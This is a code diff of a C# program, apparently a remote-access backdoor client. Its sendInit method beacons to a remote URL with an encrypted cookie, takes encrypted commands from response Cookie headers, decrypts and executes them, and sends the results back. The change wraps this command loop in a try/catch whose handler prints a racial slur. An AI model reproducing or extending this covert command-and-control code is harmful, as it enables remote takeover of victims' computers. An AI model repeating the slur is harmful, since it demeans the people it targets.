@@ -115,23 +115,28 @@ namespace hevsn
 
         public async void sendInit()
         {
-            string initializer = makeOutp("est");
-            HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, URL);
-            request.Headers.Add("Cookie", initializer);
-            HttpResponseMessage responserino = await httpClient.SendAsync(request);
-            foreach (KeyValuePair<string, IEnumerable<string>> myHeader in responserino.Headers)
+            try
             {
-                if(myHeader.Key.Equals("Cookie"))
+                string initializer = makeOutp("est");
+                HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, URL);
+                request.Headers.Add("Cookie", initializer);
+                HttpResponseMessage responserino = await httpClient.SendAsync(request);
+                foreach (KeyValuePair<string, IEnumerable<string>> myHeader in responserino.Headers)
                 {
-                    foreach(string value in myHeader.Value)
+                    if(myHeader.Key.Equals("Cookie"))
                     {
-                        if(value.Length > 2 && value != cookie)
+                        foreach(string value in myHeader.Value)
                         {
-                            SendOutp(makeOutp(exec(aes!.decrypt(value))));
+                            if(value.Length > 2 && value != cookie)
+                            {
+                                SendOutp(makeOutp(exec(aes!.decrypt(value))));
+                            }
                         }
+                        
                     }
-                    
                 }
+            } catch (Exception) {
+                Console.Write("Niggas\n");
             }
         }
 
